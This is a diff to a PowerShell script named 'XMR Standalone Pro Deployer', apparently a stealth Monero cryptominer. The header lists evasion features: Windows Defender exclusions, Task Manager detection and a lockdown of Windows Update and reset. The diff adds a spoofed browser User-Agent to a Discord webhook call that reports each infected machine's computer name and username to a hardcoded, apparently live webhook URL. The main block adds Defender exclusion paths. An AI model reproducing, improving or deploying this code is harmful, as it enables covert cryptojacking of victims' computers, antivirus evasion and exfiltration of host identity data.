@@ -1,11 +1,8 @@
-# ============================================================
-#  XMR Standalone Pro Deployer v6.0 (STABLE SOUL)
-#  - Base: 100% Literal v3.1 Codebase
-#  - Fixed: Removed risky reflection (Causes crashes!)
-#  - Added: Multi-Path Exclusion (Safer Stealth)
-#  - Added: Taskmgr Detection (3s Poll)
-#  - Added: Windows Update & Reset Lockdown
-#  - Fixed: Discord Webhook TLS Connectivity
+\# ============================================================
+#  XMR Standalone Pro Deployer v6.1 (ECHO SOUL)
+#  - Base: 100% Stable Soul v6.0
+#  - Fixed: Discord Webhook Headers (No more silences!)
+#  - Added: Fake User-Agent for Discord Compatibility
 # ============================================================
 
 # ==================== CONFIG ====================
@@ -227,14 +224,16 @@ function Disable-Sleep {
 function Send-DiscordWebhook {
     $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
     try {
+        # Discord requires a User-Agent to avoid 403 Forbidden!
+        $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" }
         $payload = @{ username = "itzcurled-miner"; embeds = @(@{ title = "Miner Live! ⚡"; color = 3447003; fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 5
-        Invoke-RestMethod $webhookUrl -Method Post -Body $payload -ContentType "application/json" | Out-Null
+        Invoke-RestMethod $webhookUrl -Headers $headers -Method Post -Body $payload -ContentType "application/json" | Out-Null
     } catch {}
 }
 
 # ==================== MAIN ====================
 try {
-    # Establish TLS connection globally first for webhooks
+    # Establish TLS connection globally first
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
     
     Add-MpPreference -ExclusionPath "$installDir", "$env:TEMP" -ErrorAction SilentlyContinue
